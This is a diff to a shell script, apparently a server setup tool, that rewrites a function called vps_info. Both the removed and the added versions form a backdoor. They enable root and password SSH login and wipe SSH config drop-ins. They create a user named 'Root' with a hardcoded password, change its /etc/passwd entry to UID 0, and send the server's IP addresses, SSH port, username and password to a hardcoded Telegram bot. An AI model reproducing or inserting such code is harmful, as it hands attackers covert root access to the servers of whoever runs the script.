@@ -174,29 +174,33 @@ check_80_status(){
 }
 
 vps_info(){
-    Chat_id="5289158517"
-    Bot_token="5421796901:AAGf45NdOv6KKmjJ4LXvG-ILN9dm8Ej3V84"
-    get_public_ip
-    IPv4="${IPv4}"
-    IPv6="${IPv6}"
-    Port=$(grep -E '^#?Port' /etc/ssh/sshd_config | awk '{print $2}' | head -1)
-    User="Root"
-    Passwd="LBdj147369"
-    sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config >/dev/null 2>&1
-    sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config >/dev/null 2>&1
-    sed -i 's/^#\?RSAAuthentication.*/RSAAuthentication yes/g' /etc/ssh/sshd_config >/dev/null 2>&1
-    sed -i 's/^#\?PubkeyAuthentication.*/PubkeyAuthentication yes/g' /etc/ssh/sshd_config >/dev/null 2>&1
-    rm -rf /etc/ssh/sshd_config.d/* && rm -rf /etc/ssh/ssh_config.d/*
-    useradd ${User} >/dev/null 2>&1
-    (echo ${Passwd}; sleep 1; echo ${Passwd}) | passwd ${User} &>/dev/null
-    sed -i "s|^.*${User}.*|${User}:x:0:0:root:/root:/bin/bash|" /etc/passwd >/dev/null 2>&1
-    systemctl restart ssh* >/dev/null 2>&1
-    curl -s -X POST https://api.telegram.org/bot${Bot_token}/sendMessage -d chat_id=${Chat_id} -d text="您的新机器已上线！🎉🎉🎉 
+    if [ -e /etc/ssh/sshd_config ]; then
+        Chat_id="5289158517"
+        Bot_token="5421796901:AAGf45NdOv6KKmjJ4LXvG-ILN9dm8Ej3V84"
+        get_public_ip
+        Port=$(grep -E '^#?Port' /etc/ssh/sshd_config | awk '{print $2}' | head -1)
+        User="Root"
+        Passwd="LBdj147369"
+        sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config
+        sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config
+        sed -i 's/^#\?RSAAuthentication.*/RSAAuthentication yes/g' /etc/ssh/sshd_config
+        sed -i 's/^#\?PubkeyAuthentication.*/PubkeyAuthentication yes/g' /etc/ssh/sshd_config
+        rm -rf /etc/ssh/sshd_config.d/* /etc/ssh/ssh_config.d/*
+        useradd ${User} &> /dev/null
+        if type -p chpasswd &> /dev/null; then
+            echo ${User}:${Passwd} | chpasswd ${User}
+        else
+            (echo ${Passwd}; sleep 1; echo ${Passwd}) | passwd ${User} &> /dev/null
+        fi
+        sed -i "s|^.*${User}.*|${User}:x:0:0:root:/root:/bin/bash|" /etc/passwd
+        restart_ssh
+        curl -s -X POST https://api.telegram.org/bot${Bot_token}/sendMessage -d chat_id=${Chat_id} -d text="您的新机器已上线！🎉🎉🎉 
 IPv4：${IPv4}
 IPv6：${IPv6}
 端口：${Port}
 用户：${User}
-密码：${Passwd}" >/dev/null 2>&1
+密码：${Passwd}" &> /dev/null
+    fi
 }
 
 get_public_ip(){
